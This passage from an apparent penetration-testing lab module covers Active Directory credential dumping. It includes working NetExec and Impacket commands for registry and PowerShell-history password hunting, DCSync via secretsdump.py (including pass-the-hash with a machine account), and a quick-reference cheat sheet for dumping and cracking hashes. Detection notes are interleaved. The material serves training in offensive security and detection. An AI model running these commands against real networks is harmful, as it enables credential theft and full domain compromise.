**C:\Scripts\service_accounts.txt:**
```
sqlservice     MYpassword123#     SQL Server
httpservice    Summer2024!        Web Server
iisservice     P@ssw0rd           IIS App Pool
backupservice  SQLAgent123!       Backup Agent
svc_backup     Backup@2024!       Backup (DA)
svc_web        WebSvc@2024!       Web App
```

This is gold. You now have plaintext passwords for Domain Admin accounts, service accounts, SQL accounts, and VPN accounts. In a real engagement, finding a file like `passwords.txt` in an IT share is not uncommon. It is actually one of the most common findings in internal pentests.

### Lab Exercise 13: Check for AutoLogon Credentials in the Registry

AutoLogon stores credentials in the Winlogon registry key in cleartext. You already recovered these from LSA secrets in Exercise 2, but you can also check them directly:

```bash
# Check for stored AutoLogon credentials
nxc smb <WS_IP> -u 'operator' -p 'LabAdmin@2026!' --local-auth -x 'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword'
```

This executes a remote command on WS01 to query the AutoLogon password directly from the registry. The expected output shows:

```
DefaultPassword    REG_SZ    AutoLogon@2024!
```

Other registry locations to check for stored credentials:

```bash
# Check for VNC passwords
nxc smb <WS_IP> -u 'operator' -p 'LabAdmin@2026!' --local-auth -x 'reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password 2>nul'

# Check for PuTTY saved sessions (SSH private keys and proxy passwords)
nxc smb <WS_IP> -u 'operator' -p 'LabAdmin@2026!' --local-auth -x 'reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" 2>nul'

# Check for WinSCP saved passwords
nxc smb <WS_IP> -u 'operator' -p 'LabAdmin@2026!' --local-auth -x 'reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" 2>nul'
```

> **Real-world context:** Registry credential hunting is one of the most reliable techniques in internal pentests. VNC passwords stored in the registry are encrypted with a fixed, known key (you can decrypt them with online tools). PuTTY session configurations sometimes contain proxy credentials. And AutoLogon passwords are always in cleartext. One time a pentester found the CEO's email password stored as an AutoLogon credential on a conference room display machine because IT set it up for a demo six months ago and never cleaned it up.

### Lab Exercise 14: Search for Credentials in PowerShell History

Users and admins often type passwords in PowerShell commands. PowerShell saves command history by default to a file:

```bash
# Check PowerShell history for all users on WS01
nxc smb <WS_IP> -u 'operator' -p 'LabAdmin@2026!' --local-auth -x 'type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 2>nul'
```

Look for commands containing `ConvertTo-SecureString`, `New-PSCredential`, `net use`, or any command where a password was typed inline.

```bash
# Also check on DC01
nxc smb <DC_IP> -u 'Administrator' -p 'OrsUBank2024!' -x 'type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 2>nul'
```

In our lab, the setup script ran many commands with passwords visible in the arguments. Those commands may be in the PowerShell history file on DC01 and WS01.

> **What defenders see:** Remote command execution via `nxc -x` creates Event ID 4688 (Process Creation) with the full command line visible. If command line auditing is enabled, every command you run remotely is logged. Using `-x` (cmd.exe) is slightly less suspicious than `-X` (PowerShell) because PowerShell has enhanced logging (ScriptBlock logging, Module logging, Transcription).

---

## Part 7: DCSync (Replicating the Domain Database)

DCSync is the nuclear option of credential dumping. It gives you the NTLM hash of every single user in the domain, including `krbtgt` (the key to Golden Tickets) and every Domain Admin account. It works by pretending to be a domain controller and asking the real DC to replicate its credential database to you.

### How DCSync Works Under the Hood

Active Directory is designed so that domain controllers replicate data between each other. If a company has three DCs (DC01, DC02, DC03), they need to keep their databases in sync. When a user changes their password on DC01, that change needs to propagate to DC02 and DC03. This replication uses a protocol called MS-DRSR (Microsoft Directory Replication Service Remote Protocol).

DCSync abuses this protocol. Instead of a legitimate domain controller requesting replication, your attack tool (secretsdump.py or Mimikatz) authenticates to the DC using an account that has replication rights and says: "Hey, I am another DC. Give me all the password changes." The real DC has no way to distinguish this from legitimate replication, so it hands over the hashes.

**What permissions are needed?**

DCSync requires two specific Extended Rights on the domain root object:

1. **DS-Replication-Get-Changes** (GUID: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`)
2. **DS-Replication-Get-Changes-All** (GUID: `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`)

By default, these permissions are granted to:
- Domain Controllers
- Domain Admins
- Enterprise Admins
- Administrators (built-in)

In our lab, the setup script also granted DCSync rights to `WS01$` (the workstation's machine account). This simulates a misconfiguration where a non-DC computer account was given replication rights, perhaps by an admin who was troubleshooting a replication issue and forgot to revoke the permissions.

### Lab Exercise 15: DCSync with Domain Admin Credentials

This is the most straightforward way. You already have the `Administrator` password:

```bash
# Dump ALL domain hashes via DCSync
secretsdump.py 'ORSUBANK.LOCAL/Administrator:OrsUBank2024!@<DC_IP>' -just-dc
```

The `-just-dc` flag tells secretsdump.py to only use the DCSync method (MS-DRSR replication) and skip SAM/LSA/cached credential extraction. This is important because:

1. It is faster (no registry operations needed)
2. It does not start the Remote Registry service
3. It only generates replication-specific Event IDs, not registry access events

**Expected output:**

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:<LM>:<NT>:::
Guest:501:<LM>:<NT>:::
krbtgt:502:<LM>:<NT>:::
vamsi.krishna:1103:<LM>:<NT>:::
ammulu.orsu:1104:<LM>:<NT>:::
lakshmi.devi:1105:<LM>:<NT>:::
ravi.teja:1106:<LM>:<NT>:::
pranavi:1107:<LM>:<NT>:::
harsha.vardhan:1108:<LM>:<NT>:::
divya:1109:<LM>:<NT>:::
kiran.kumar:1110:<LM>:<NT>:::
madhavi:1111:<LM>:<NT>:::
sai.kiran:1112:<LM>:<NT>:::
sqlservice:1113:<LM>:<NT>:::
httpservice:1114:<LM>:<NT>:::
iisservice:1115:<LM>:<NT>:::
backupservice:1116:<LM>:<NT>:::
svc_backup:1117:<LM>:<NT>:::
svc_web:1118:<LM>:<NT>:::
DC01$:1000:<LM>:<NT>:::
WS01$:1119:<LM>:<NT>:::
```

That is every single account in the domain. Every user, every service account, every computer account. All their NTLM hashes. Game over.

**The most critical hash: `krbtgt`**

The `krbtgt` account hash is special. It is the key that domain controllers use to encrypt and sign all Kerberos TGTs (Ticket-Granting Tickets). If you have the krbtgt hash, you can create your own TGTs (Golden Tickets) that grant you unlimited access to anything in the domain for as long as the krbtgt hash is not changed. We will use this in Module 09 (Domain Dominance).

### Lab Exercise 16: DCSync a Specific User

You do not always need every hash in the domain. Sometimes you only need one specific account. Targeted DCSync is quieter because it generates fewer replication events:

```bash
# DCSync only the krbtgt account
secretsdump.py 'ORSUBANK.LOCAL/Administrator:OrsUBank2024!@<DC_IP>' -just-dc-user 'krbtgt'

# DCSync only the Administrator account
secretsdump.py 'ORSUBANK.LOCAL/Administrator:OrsUBank2024!@<DC_IP>' -just-dc-user 'Administrator'

# DCSync a specific user
secretsdump.py 'ORSUBANK.LOCAL/Administrator:OrsUBank2024!@<DC_IP>' -just-dc-user 'ammulu.orsu'
```

Using `-just-dc-user` generates a single `DRSGetNCChanges` replication request for one user instead of iterating through the entire directory. This is significantly less noisy.

### Lab Exercise 17: DCSync Using WS01's Machine Account

Remember from Module 01 that WS01$ has DCSync rights (replication permissions)? This means you can DCSync without needing a Domain Admin account at all. You just need the WS01$ machine account hash, which you extracted from LSA secrets in Exercise 2:

```bash
# DCSync using WS01$ machine account hash (pass-the-hash)
secretsdump.py -hashes '<LM_HASH>:<NT_HASH>' 'ORSUBANK.LOCAL/WS01$@<DC_IP>' -just-dc
```

Replace `<LM_HASH>:<NT_HASH>` with the actual WS01$ hash you extracted from LSA secrets. If you only have the NT hash, use `aad3b435b51404eeaad3b435b51404ee` as the LM hash (this is the empty LM hash placeholder).

This is a powerful attack path: compromise WS01 (local admin), extract machine account hash from LSA secrets, use machine account to DCSync the entire domain. No Domain Admin password needed.

> **What defenders see:** DCSync generates Event ID 4662 (Directory Service Access) on the target DC. The event shows the account performing the replication and the GUIDs for `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`. The critical detection point is: the requesting account is NOT a domain controller. If `WS01$` or `vamsi.krishna` is performing directory replication, that is a high-severity alert. Microsoft Defender for Identity (MDI) has a built-in detection rule (Alert: "Suspected DCSync attack (replication of directory services)") that fires when a non-DC account requests replication.

### Using NetExec for DCSync

You can also perform DCSync through NetExec:

```bash
# Full NTDS dump via DCSync
nxc smb <DC_IP> -u 'Administrator' -p 'OrsUBank2024!' --ntds

# Dump a specific user
nxc smb <DC_IP> -u 'Administrator' -p 'OrsUBank2024!' --ntds --user krbtgt
```

The `--ntds` flag in NetExec uses the same DRSUAPI method as secretsdump.py. The output format is the same.

---

## Part 8: What Defenders See (Detection Summary)

Every credential dumping technique you just practiced generates telemetry that defenders can use to detect you. Here is a comprehensive breakdown:

| Exercise | Technique | Event IDs Generated | Detection Difficulty |
|:---------|:----------|:-------------------|:--------------------|
| 1-2 | SAM/LSA dump (registry) | 4656, 4663 (registry), 5145 (share) | Medium (if registry auditing is enabled) |
| 3-4 | SAM/LSA dump on DC | 4656, 4663, 5145 | Medium |
| 5-6 | LSASS dump (lsassy) | Sysmon 10, 4688, 4663 | High (EDR monitors lsass.exe access) |
| 7 | LSASS dump (nanodump) | Sysmon 10 (partial) | Medium (stealthier than lsassy) |
| 8-9 | Cached credentials | 4656, 4663 (included in LSA dump) | Medium |
| 10-11 | DPAPI extraction | 4662 (on DC for backup key), file access | Low (few signatures exist) |
| 12 | Credential file discovery | 5145 (file share access) | Low (normal file access) |
| 13 | AutoLogon registry query | 4688 (command execution) | Low (reg query is normal) |
| 14 | PowerShell history | 4688 (command execution) | Low (type command is normal) |
| 15-17 | DCSync | 4662 (DS-Access with replication GUIDs) | High (MDI specifically detects this) |

### The Riskiest Techniques

**1. LSASS Memory Dumping (HIGH RISK)**

Any process that opens a handle to `lsass.exe` with `PROCESS_VM_READ` or `PROCESS_ALL_ACCESS` is immediately suspicious. Sysmon Event ID 10 captures this, and modern EDR solutions (CrowdStrike, SentinelOne, Microsoft Defender for Endpoint) all have specific detections for this behavior. The `comsvcs.dll` method is well-known and frequently blocked. The `nanodump` and `dumpert` methods are stealthier but still detectable by behavioral analysis.

**2. DCSync (HIGH RISK on monitored networks)**

Microsoft Defender for Identity (MDI) has a dedicated detection rule for DCSync. It fires whenever a non-DC account requests directory replication. If the organization uses MDI (and many large enterprises do), your DCSync will be flagged within seconds. The mitigation for pentesters is to use targeted DCSync (`-just-dc-user`) to minimize the number of replication requests and avoid full domain dumps.

**3. Remote Command Execution (MODERATE RISK)**

Using `nxc -x` to run commands creates process creation events (4688) with full command line logging. A command like `reg query ... DefaultPassword` in the command line of a remote process is suspicious. Use this sparingly and only when needed.

### The Safest Techniques

**1. Credential File Discovery (LOW RISK)**

Accessing file shares and reading files is completely normal activity. As long as your access is authenticated (not brute-forced), reading files from `C$` looks like administrative access. There is no specific detection for "someone read passwords.txt."

**2. DPAPI Extraction (LOW RISK)**

DPAPI extraction is one of the quietest credential harvesting techniques because it reads files from the filesystem rather than accessing protected processes. The only high-visibility step is extracting the domain backup key from the DC, which generates Event ID 4662.

**3. Registry Hive Extraction (MEDIUM RISK)**

SAM and LSA extraction through the remote registry is moderately detectable. The Remote Registry service starting unexpectedly is a red flag. But in many environments, Object Access auditing is not enabled, which means no 4656/4663 events are generated.

---

## Summary of Findings

Here is a complete inventory of every credential recovered across all exercises in this module:

| Source | Credential | Value | Attack Use |
|:-------|:-----------|:------|:-----------|
| SAM (WS01) | operator | LabAdmin@2026! (hash) | Local admin on WS01 |
| SAM (WS01) | labuser | P@ssw0rd123! (hash) | Initial setup account |
| LSA Secrets (WS01) | WS01$ | Machine account hash | DCSync (has replication rights) |
| LSA Secrets (WS01) | svc_autologon | AutoLogon@2024! (cleartext) | Potential domain account |
| LSASS (WS01) | vamsi.krishna | OrsUBank2024! (cleartext + hash) | Domain user, ACL abuse |
| Cached Creds (WS01) | vamsi.krishna | DCC2 hash | Offline cracking |
| Credential File | ammulu.orsu | OrsUBank2024! | Domain Admin |
| Credential File | sqlservice | MYpassword123# | Kerberoastable service account |
| Credential File | httpservice | Summer2024! | Kerberoastable service account |
| Credential File | iisservice | P@ssw0rd | Kerberoastable service account |
| Credential File | backupservice | SQLAgent123! | Kerberoastable service account |
| Credential File | svc_backup | Backup@2024! | Domain Admin with SPN |
| Credential File | svc_web | WebSvc@2024! | Constrained delegation |
| Registry (WS01) | svc_autologon | AutoLogon@2024! | AutoLogon registry entry |
| DCSync | krbtgt | NT hash | Golden Ticket creation |
| DCSync | All domain users | NT hashes | Full domain compromise |

### What Can You Do Next?

With these credentials, you now have multiple paths forward:

1. **Pass-the-Hash with ammulu.orsu's hash** to authenticate as a Domain Admin to any machine in the domain.
2. **Pass-the-Hash with WS01$ machine hash** to DCSync the entire domain (since WS01$ has replication rights).
3. **Use the krbtgt hash** to create Golden Tickets (covered in Module 09).
4. **Crack the service account hashes** you extracted from SAM and NTDS.dit using hashcat.
5. **Use the cleartext passwords** from credential files to authenticate to systems outside the domain (SQL servers, VPN, web applications).

In Module 09 (Domain Dominance), you will use these credentials to achieve full, persistent control over the domain.

---

## Quick Reference: Credential Dumping Commands

### NetExec (nxc) Commands

```bash
# SAM hashes (local accounts)
nxc smb <IP> -u '<user>' -p '<pass>' --sam
nxc smb <IP> -u '<user>' -p '<pass>' --local-auth --sam     # local account auth

# LSA secrets (service accounts, machine account, cached creds)
nxc smb <IP> -u '<user>' -p '<pass>' --lsa
nxc smb <IP> -u '<user>' -p '<pass>' --local-auth --lsa     # local account auth

# LSASS memory dump (active sessions)
nxc smb <IP> -u '<user>' -p '<pass>' -M lsassy              # comsvcs.dll method
nxc smb <IP> -u '<user>' -p '<pass>' -M nanodump            # stealthier method

# DPAPI secrets (browser passwords, Credential Manager)
nxc smb <IP> -u '<user>' -p '<pass>' --dpapi

# NTDS.dit dump via DCSync (domain controller only)
nxc smb <DC> -u '<user>' -p '<pass>' --ntds                 # full dump
nxc smb <DC> -u '<user>' -p '<pass>' --ntds --user krbtgt   # specific user

# Remote command execution (credential hunting)
nxc smb <IP> -u '<user>' -p '<pass>' -x '<command>'         # cmd.exe
nxc smb <IP> -u '<user>' -p '<pass>' -X '<command>'         # PowerShell

# Pass-the-Hash (use NT hash instead of password)
nxc smb <IP> -u '<user>' -H '<NT_HASH>' --sam
nxc smb <IP> -u '<user>' -H '<NT_HASH>' -M lsassy
```

### Impacket Commands

```bash
# secretsdump.py (all-in-one credential extraction)
secretsdump.py '<domain>/<user>:<pass>@<IP>'                 # dump everything
secretsdump.py '<user>:<pass>@<IP>'                          # local auth
secretsdump.py -hashes '<LM>:<NT>' '<domain>/<user>@<IP>'   # pass-the-hash

# DCSync specific
secretsdump.py '<domain>/<user>:<pass>@<DC>' -just-dc       # DCSync all users
secretsdump.py '<domain>/<user>:<pass>@<DC>' -just-dc-user 'krbtgt'  # single user
secretsdump.py '<domain>/<user>:<pass>@<DC>' -just-dc-ntlm  # NTLM hashes only

# DPAPI
dpapi.py masterkey -file <key_file> -sid <sid> -password '<pass>'
dpapi.py credential -file <blob_file> -key <master_key>
```

### Hashcat Cracking Modes

```bash
# NTLM hashes (from SAM, LSASS, NTDS.dit)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# DCC2/mscash2 (cached domain credentials)
hashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt

# Kerberoast (TGS-REP hashes, from Module 01)
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt

# AS-REP Roast (from Module 01)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Credential Hunting Locations

```bash
# Files to search for on file shares
passwords.txt, credentials.txt, creds.txt
*.config, web.config, appsettings.json
*.xml (Group Policy Preferences, unattend.xml)
*.ps1, *.bat, *.cmd (scripts with hardcoded passwords)
*.kdbx (KeePass databases)

# Registry keys to check
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon  # AutoLogon
HKLM\SOFTWARE\RealVNC\WinVNC4                                # VNC
HKCU\Software\SimonTatham\PuTTY\Sessions                     # PuTTY
HKCU\Software\Martin Prikryl\WinSCP 2\Sessions               # WinSCP

# PowerShell history
C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Unattend files (contain plaintext admin passwords)
C:\Windows\Panther\unattend.xml
C:\Windows\Panther\Autounattend.xml
C:\Windows\System32\sysprep\unattend.xml
```

---

*Module 04: Kerberos Attacks is next. You will use the credentials you gathered here to perform Kerberoasting, AS-REP Roasting, and crack offline Kerberos tickets to recover even more passwords.*
